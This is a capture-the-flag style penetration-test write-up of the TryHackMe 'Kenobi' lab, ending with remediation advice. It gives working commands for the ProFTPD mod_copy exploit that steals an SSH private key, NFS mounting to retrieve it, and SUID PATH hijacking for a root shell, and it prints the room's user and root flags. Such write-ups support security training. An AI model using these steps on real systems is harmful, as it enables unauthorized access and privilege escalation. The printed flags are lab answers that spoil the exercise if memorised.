# Kenobi Penetration Test Report
**Target IP:** 10.49.164.52  
**Platform:** TryHackMe  
**Difficulty:** Easy/Intermediate  
**Report Author:** [Your Name/Alias]  
**Date:** 22 December 2025  

---

## 1. Reconnaissance & Enumeration  
**Nmap Scan Results**  
*Open Ports & Services:*  
- `21/tcp` – FTP (ProFTPD 1.3.5)  
- `22/tcp` – SSH (OpenSSH 8.2p1)  
- `80/tcp` – HTTP (Apache 2.4.41)  
- `111/tcp` – RPCbind  
- `139/tcp` – Samba SMB (Samba 4)  
- `445/tcp` – Samba SMB  
- `2049/tcp` – NFS  

*OS Detection:*  
- Linux Kernel 4.15  
- Network Distance: 3 hops  

---

## 2. SMB & NFS Enumeration  
**SMB Shares** (via `smbclient -L`):  
```
Sharename       Type      Comment
anonymous       Disk      
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service
```  
*Key Finding:* `anonymous` share contained `log.txt` revealing:  
1. SSH key generation for user `kenobi` (`/home/kenobi/.ssh/id_rsa`)  
2. ProFTPD 1.3.5 configuration (running as user `kenobi`)  

**NFS Exports** (via `showmount -e`):  
```
/var *
```  
Mounted locally to retrieve data copied via FTP exploit.

---

## 3. FTP Exploitation (ProFTPD 1.3.5)  
**Vulnerability:** `mod_copy` module allows unauthenticated file copy via `SITE CPFR`/`SITE CPTO`.  

**Exploitation Steps:**  
1. Copy SSH private key to accessible location:  
   ```bash
   SITE CPFR /home/kenobi/.ssh/id_rsa
   SITE CPTO /var/tmp/id_rsa
   ```  
2. Mount NFS share and retrieve key:  
   ```bash
   sudo mount -t nfs 10.49.164.52:/var /mnt/kenobiNFS
   cp /mnt/kenobiNFS/tmp/id_rsa /tmp/
   chmod 600 /tmp/id_rsa
   ```  
3. SSH access as `kenobi`:  
   ```bash
   ssh -i /tmp/id_rsa kenobi@10.49.164.52
   ```  

**User Flag Captured:**  
```
d0b0f3f53b6caa532a83915e19224899
```  

---

## 4. Privilege Escalation  
**SUID Binaries Enumeration** (via `find / -perm -u=s -type f 2>/dev/null`):  
Notable binary: `/usr/bin/menu` (custom SUID).  

**Binary Analysis:**  
- Running `/usr/bin/menu` presented 3 options:  
  1. Status check → executes `curl -I localhost`  
  2. Kernel version → executes `uname -r`  
  3. Ifconfig → executes `ifconfig`  
- Commands called **without absolute paths**, allowing PATH hijacking.  

**Exploitation:**  
1. Create malicious `curl` executable:  
   ```bash
   echo '/bin/bash' > /tmp/curl
   chmod +x /tmp/curl
   ```  
2. Hijack PATH and execute SUID binary:  
   ```bash
   export PATH=/tmp:$PATH
   /usr/bin/menu  # Select option 1
   ```  
3. Root shell obtained.  

**Root Flag Captured:**  
```
177b3cd8562289f37382721c28381f02
```  

---

## 5. Vulnerability Summary  
| Service          | Vulnerability               | Impact                          |
|------------------|-----------------------------|---------------------------------|
| ProFTPD 1.3.5    | `mod_copy` command execution | SSH key theft → user access     |
| NFS              | World-readable `/var` export | Unauthorized file access        |
| SUID Binary      | PATH hijacking in `/usr/bin/menu` | Privilege escalation → root |

---

## 6. Remediation Recommendations  
1. **ProFTPD:** Disable `mod_copy` or upgrade to patched version.  
2. **NFS:** Restrict exports to specific IPs; avoid sharing sensitive directories.  
3. **SUID Binaries:** Avoid SUID on custom binaries; use absolute paths in code.  
4. **SMB:** Require authentication for shares containing sensitive data.  

---

## 7. Key Takeaways  
- **Enumeration is critical:** The `log.txt` file provided the attack roadmap.  
- **Misconfigurations cascade:** A weak NFS export amplified the FTP vulnerability.  
- **SUID binaries require scrutiny:** Custom privileged tools should be audited for path safety.  

---

**TryHackMe Room:** [Kenobi](https://tryhackme.com/room/kenobi)  

